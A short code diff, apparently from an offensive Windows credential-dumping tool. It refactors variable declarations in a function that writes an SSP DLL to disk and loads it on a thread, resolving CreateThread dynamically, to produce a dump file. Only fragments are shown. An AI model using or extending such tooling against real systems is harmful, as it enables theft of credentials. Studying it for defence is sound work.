@@ -104,9 +104,14 @@ VOID run_technique(
     IN LPSTR dump_path,
     IN BOOL use_valid_sig)
 {
-    BOOL  success         = FALSE;
-    LPSTR random_dll_path = NULL;
-    LPSTR final_path      = NULL;
+    BOOL   success         = FALSE;
+    LPSTR  random_dll_path = NULL;
+    LPSTR  final_path      = NULL;
+    BOOL   dump_worked     = FALSE;
+    HANDLE hThread         = NULL;
+    DWORD  dwThreadId      = 0;
+
+    CreateThread_t CreateThread = NULL;
 
     // first of all, write the SSP DLL in the filesystem
 
@@ -133,11 +138,6 @@ VOID run_technique(
     // we are going to pass parametesr to the DLL, so we will load it on a separate thread and
     // pass the parameters via a named pipe
 
-    BOOL   dump_worked = FALSE;
-    HANDLE hThread     = NULL;
-    DWORD  dwThreadId  = 0;
-
-    CreateThread_t CreateThread = NULL;
 
     CreateThread = (CreateThread_t)(ULONG_PTR)get_function_address(
         get_library_address(KERNEL32_DLL, TRUE),
@@ -148,7 +148,6 @@ VOID run_technique(
         api_not_found("CreateThread");
         goto cleanup;
     }
-
 
     // load the SSP library in a thread because it will lock otherwise
     hThread = CreateThread(NULL, 0, load_ssp, final_path, 0, &dwThreadId);
